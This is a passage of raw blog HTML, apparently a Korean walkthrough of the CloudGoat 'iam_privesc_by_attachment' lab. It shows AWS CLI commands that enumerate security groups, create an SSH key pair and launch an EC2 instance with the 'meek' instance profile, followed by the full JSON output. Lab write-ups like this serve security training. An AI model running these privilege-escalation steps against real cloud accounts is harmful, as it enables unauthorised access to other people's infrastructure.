url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQY022OzU7CUBgFP6VA2kZo7y3UUqH1gsUAIiYQFQ0gvxFZ6MKtL+Ir+M5jQJcsJjmbMxkxrRtMq0eSXpOaLr3OHeFoRbU9JDVtOjrjvTBg7XTJbI1SMSc5j1xeYRX0P3/71PKRp+cF09mKyWTJfPnK+mVF4+2L9nTHZrvlozfnp/7Jd3PHTMVcxAbJeZT9Op5K0JVLfJ2gqwbbPUdEHGw3IowySl4Dv2KoBQlR2EQFBikqpKQRVyGWQuTsULKvPIb0B2OGoymP4yX34wX92wfyQRPbb1BWMYFT48pKSIt1dFHjuNXDcS89xi9DvWnTI5WYSQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/588d8302d877fe5484458d00c4bd1492/37523/9.png\"\n        srcset=\"/static/588d8302d877fe5484458d00c4bd1492/e9ff0/9.png 180w,\n/static/588d8302d877fe5484458d00c4bd1492/f21e7/9.png 360w,\n/static/588d8302d877fe5484458d00c4bd1492/37523/9.png 720w,\n/static/588d8302d877fe5484458d00c4bd1492/b7877/9.png 891w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>인스턴스에서 필요한 subnet 부분을 쿼리로 검색한 결과 2개의 데이터가 출력이 되었습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances \\\n    --query 'Reservations<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span>.Instances<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span>.<span class=\"token punctuation\">[</span>SecurityGroups<span class=\"token punctuation\">]</span>' \\\n    --output text --profile kerrigan\n\nsg-04ffcf8e873ee2103    cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\nsg-063079fb3bea2c77e    cg-ec2-http-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+ElEQVQY01XOW0+CcACGcSxn2VA0TcSYC0Hw0F9seCBMUPFYzWrW+jpd9bWfJhetLp797t690uQhZhFvGQwDptGKOJzT3n2ixR/MwxnxaMFXYct3451DyaTndMnKGjlFp1i6oVwxuSwbiUqxjqRqNnq9y/lFNdGyPYyGwGz0MKw+dntIrSnIFGpkchqyoiPnrzlJF0mdFhL/JjUdj7tBxPh+laTWHEyrT6vlJWMd4WO7PropcISP0xlRqVqcZSukM6Xf0aPHpMl0zWb3xnK1Z7l+wbZdRLDGDZ+JZlsW4SOvYsPB3/M0jvFHEbduQFf4XKkWUir/7+EPpSdz1axWD8wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"10\"\n        title=\"10\"\n        src=\"/static/d1363b714e2aa9dad4e05742f0d68a9e/37523/10.png\"\n        srcset=\"/static/d1363b714e2aa9dad4e05742f0d68a9e/e9ff0/10.png 180w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/f21e7/10.png 360w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/37523/10.png 720w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/4ef49/10.png 890w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>앞서 출력된 서브넷 정보와 보안 그룹을 열거하고 EC2 인스턴스에 대한 SSH 액세스를 허용하는 보안 그룹을 분석하였습니다.</li>\n</ul>\n<h3 id=\"ec2-key-pair-생성\" style=\"position:relative;\"><a href=\"#ec2-key-pair-%EC%83%9D%EC%84%B1\" aria-label=\"ec2 key pair 생성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Key pair 생성</h3>\n<ul>\n<li>앞선 필요한 정보들을 수집한후 AWS 계정에서 기존 key-pair를 사용할 수 없기 때문에 새로운 SSH key-pair를 생성하였습니다. 생성할 수 있는 EC2 머신에서 SSH 연결하려면 새로운 key-pair가 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 create-key-pair \\\n    --key-name fake-ec2  \\\n    --query 'KeyMaterial' \\\n    --output text > fake-ec2.pem \\\n    --region us-east<span class=\"token number\">-1</span> \\\n    --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACP0lEQVQ4y4VRXU9TQRBdeovQNoQC8lVLkEIpFNr7uXv3fu+9t6UFUR6UByX6QtAnE302/vZjZgsaE8SHkzMzmzk7Z4YFXQ9+x0W8LzB4OUCra6J2HKG928PB3gnszT7CXRfhrgO5YyHa85B0OOIOR96ViA4Frhsuvi5leNvwwL5F1/gxucPP6BPe8Qs4yRh9OUHvlMM7lrht5fjSLvH5HrdbCjdNiZsViY+rIT6sBbh75uP7QoL3Cy6Yl05gyhwnIoNIJvBlCcEVHE/B5gpmVOJUKtjJSHP7yAJjNTBW/wOjDlapgRkNMI8r2E6KoRlp5n4By03hcKVj11Pw/RJCUJyh13NhGE1Uq6t/Yf6eWZJdIEqmSNUrUFyMrnQcRGezmrpAXr7Rb5T3TyXmjCYq1ZVHwagxTKaI0ik8v0AQT+AHI3ii0KJxeq5rYTzRgt0jF6yy/G9B2pXlpHC8DKYdw3ISbZVANYIfjDXbXoa9A/PpCR8s++FYN9JEBKrTpDRVll8iIS4ucTKQT09ItgjUzGUJGY4169wv9GfiPif0jvnTE5IVlysM7Ri2m8EVObhfziy66W/bQyvSHxz+b4d0wTg714fRVx5fIR9dIUrPkeYzu3QQeiPLdOVHBY0ZGAmRlQfbQXiGJJ1q66p4rS9M+xPBCAMzQufA0oJkmxlNzFVmzKrLYNUmmCcUhCxAzIVCfxhgc9/G9otDtHeO0Gr3dNxY2sZC7Tlq9Q0s1tc11xubWGxsYG1+C22jhXVjC78Ac5+De3qwFowAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"11\"\n        title=\"11\"\n        src=\"/static/33d226002a7b47a93a98a8cfc082615f/37523/11.png\"\n        srcset=\"/static/33d226002a7b47a93a98a8cfc082615f/e9ff0/11.png 180w,\n/static/33d226002a7b47a93a98a8cfc082615f/f21e7/11.png 360w,\n/static/33d226002a7b47a93a98a8cfc082615f/37523/11.png 720w,\n/static/33d226002a7b47a93a98a8cfc082615f/136a2/11.png 884w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 key-pair를 생성하였습니다.</li>\n<li>새로운 EC2 인스턴스를 생성하는 데 있어서 필요한 모든 정보들을 수집하였고 이에 대해 EC2 인스턴스를 생성하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABQUlEQVQoz51R207CQBDtT+EPgPwG/g6PQISv0fRR+wDPhsQovdcqTQvstT1mtt1qiCHESU5mZ3bmzNlZZ/seIQhjvGxf4YcxHh5d3E0muF+ukOVf2AURgjhFmGZ42wUIohR+mCBKMvhR65Ms784fcISqoXQNJiTInp49jMe3mM3mJmZcQiptIKRqYeL6B7r1Sjdw0FlT18av12uMRiOsVksT113+WnOapgFBa20Sm80Gw+EQ83mrkPK25hr0Ci2h53m4GQwwnU7/R1iVBYqiAOfCEPi+j8ViAdd1LxKaNf1FyBnD8XhEVVUoy7Ivtvs7J+Gc43A4mFrqsTidTma4ebIQAkkcmwtqYIz1yjopvdo0SbDf700PDaQcwQ43n0JE9GwqIjILKWVfaAk/8xyM8cu/THKJjAjOQfnfa1BKXdzhN6ye+s4328RsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"12\"\n        title=\"12\"\n        src=\"/static/2538f46ed86b9378dbc55894c66ee7c3/37523/12.png\"\n        srcset=\"/static/2538f46ed86b9378dbc55894c66ee7c3/e9ff0/12.png 180w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/f21e7/12.png 360w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/37523/12.png 720w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/302a4/12.png 1080w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/07a9c/12.png 1440w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/1f038/12.png 1481w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token number\">1</span>. 대상 EC2 인스턴스와 동일한 서브넷\n<span class=\"token number\">2</span>. SSH 액세스를 허용하는 보안 그룹\n<span class=\"token number\">3</span>. SSH 인증을 위한 SSH 키 쌍으로 새로 생성\n<span class=\"token number\">4</span>. cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu 인스턴스 프로필 연결\n\naws ec2 run-instances \\\n    --image-id ami-0a313d6098716f372 \\\n    --instance-type t2.micro \\\n    --iam-instance-profile Arn=arn<span class=\"token operator\">:</span>aws<span class=\"token operator\">:</span>iam<span class=\"token operator\">:</span><span class=\"token operator\">:</span>&lt;USERID><span class=\"token operator\">:</span>instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --key-name fake-ec2 \\\n    --subnet-id subnet-04d05182b53c1ff11 \\\n    --security-group-ids sg-04ffcf8e873ee2103 \\\n    --region us-east<span class=\"token number\">-1</span> \\\n    --profile kerrigan\n\narn<span class=\"token operator\">:</span>aws<span class=\"token operator\">:</span>iam<span class=\"token operator\">:</span><span class=\"token operator\">:</span>&lt;USERID><span class=\"token operator\">:</span>instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 91.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZUlEQVQ4y5VUyXLaUBAUi80ugQQIEIsWdoEA2QUIDIUxiZ3C8SWHnPIbIa5K5Q/yMfnCTs0IiC8BfGi9V5Jeq6enR8K62cXDYoVO28XK22A9XWN4/wXu/Bk7+wW/rBe8Glvsqk/4XnnCrvYJr/qW15/mZ/wwn/E79og/ia/4Fh1DSMTzMEwHcs5E1/HguEsMBx6Gozkm7j369VtYWg+aUkcpYyIv1hgFyUAuVYUq6pBlHZJSQzShQkgrOopaG72+h0bTRbN9C7MxQlXvoWL0oOk25LyBcCyLUFRBKKIgFPX3/r0swtcKriJZhK5kCHRRiw2Mpw9whnOMpxsY1gC66TC0SgdJUUMglL4IQiSWh5IzoBabvEqZCoSgBEFI8RoMZ94FVlgzHS4xLddwHc0hlij4D4k0IB6JScFZwsNBOavD7nsw60NGo3UDqzHisqlkeudAeorYJwyIyBfq7J/teKg3XQzdBZMWtRayeRPRuPoOhQEJUqaKwWjBZAcLSFkiVWRfxXT5ckJ6MZ4solBqMtJyFWK6wn5S0ygWb308W7K/kdizifeBY0PEVGYiVfIDS50PiEey/5EKBzIqL6danDvyjLwjX+WsweWmCFL5bLePXSZF3vwjlqsteo7HRAWtxR9ISRriyQLbchlhUOLsUclEQHtOvZD8l8V9Hi8qmR6S+Ydx0y0H5WqXm0INIdAAvD142sOAiJxaR8+ZsXcde8IR6g9mHCOaIB78vdJTKvceiscfxOhmicHoDrO7R56YjKJzhKghlEeKFCk+q5A6O/E2sPtTf+Qsh70kULgpPkRKDTpF+Be8qb6OycpiBQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"13\"\n        title=\"13\"\n        src=\"/static/e125104d7ab09f203228d9435f880f44/37523/13.png\"\n        srcset=\"/static/e125104d7ab09f203228d9435f880f44/e9ff0/13.png 180w,\n/static/e125104d7ab09f203228d9435f880f44/f21e7/13.png 360w,\n/static/e125104d7ab09f203228d9435f880f44/37523/13.png 720w,\n/static/e125104d7ab09f203228d9435f880f44/84cc5/13.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJElEQVQoz12QCW/CMAyF+///4CYBE2J0vTjWtImPHG9KWjrA0qfnJvazm+r7csOuueKjHnBoe3yeT9jXHb6aAV9NX3Rft9idWxx+Ohz7K3bnBsfuivo24jTc0RqLdszMqC7DgL7rME8GTA7sCOQcKOdEhSV3YKZNVaXgswqvCKrZWkyzBRGDRUDMYGaIKmKMGyGsxAUfwkZ40mo0UynIkfAf1royyGlAiAlICSktFY4I1lq8R76vsmtai9NTk7EGLIzFK20NyzCL0RgwS/kbFgXp4lM55+C9f5mSIz+FiJTNHucFAKpaesp3jEXjel/dZ0ZmIoWGuBnnQdM0wTmCiBZYA9hHEAtIfMnLmQZY8cW0+rUC4xQzaXmr501eNnsjxlcevX/mZXCgAvxZpAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"14\"\n        title=\"14\"\n        src=\"/static/b9e28e89a69c9f6fb0f7e18c875fd940/37523/14.png\"\n        srcset=\"/static/b9e28e89a69c9f6fb0f7e18c875fd940/e9ff0/14.png 180w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/f21e7/14.png 360w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/37523/14.png 720w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/302a4/14.png 1080w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/07a9c/14.png 1440w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/dca52/14.png 1550w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로운 EC2 인스턴스를 성공적으로 생성할 수 가 있습니다. 출력되는 정보는 새 EC2 인스턴스의 세부정보이기 때문에 저장을 해둡니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"Groups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"Instances\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"AmiLaunchIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ImageId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ami-0a313d6098716f372\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"InstanceId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"i-0a726b6396cec2a5e\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"InstanceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"t2.micro\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"KeyName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"fake-ec2\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"LaunchTime\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-12T18:29:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Monitoring\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"disabled\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Placement\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"AvailabilityZone\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"us-east-1a\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Tenancy\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"default\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ProductCodes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PublicDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Code\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"StateTransitionReason\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SubnetId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"subnet-04d05182b53c1ff11\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"VpcId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"vpc-01585d6620e5d752f\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Architecture\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"x86_64\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"BlockDeviceMappings\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ClientToken\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"8e003941-0ceb-47b4-9730-71cb25aa529d\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EbsOptimized\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EnaSupport\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Hypervisor\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"xen\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"IamInstanceProfile\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Arn\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"AIPA2MALBVI5RQHINFLHJ\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"NetworkInterfaces\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Attachment\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token property\">\"AttachTime\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-12T18:29:38+00:00\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"AttachmentId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eni-attach-03cf3a976529cfabe\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"DeleteOnTermination\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"DeviceIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"Status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"attaching\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"NetworkCardIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Groups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token punctuation\">{</span>\n                            <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"GroupId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sg-04ffcf8e873ee2103\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Ipv6Addresses\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"MacAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0a:fc:1e:7d:bf:59\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"NetworkInterfaceId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eni-0aad79f50a762977a\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"OwnerId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateIpAddresses\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token punctuation\">{</span>\n                            <span class=\"token property\">\"Primary\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"SourceDestCheck\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"in-use\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"SubnetId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"subnet-04d05182b53c1ff11\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"VpcId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"vpc-01585d6620e5d752f\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"InterfaceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"interface\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"RootDeviceName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/dev/sda1\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"RootDeviceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ebs\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SecurityGroups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"GroupId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sg-04ffcf8e873ee2103\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SourceDestCheck\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"StateReason\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Code\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Message\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"VirtualizationType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hvm\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"CpuOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"CoreCount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token 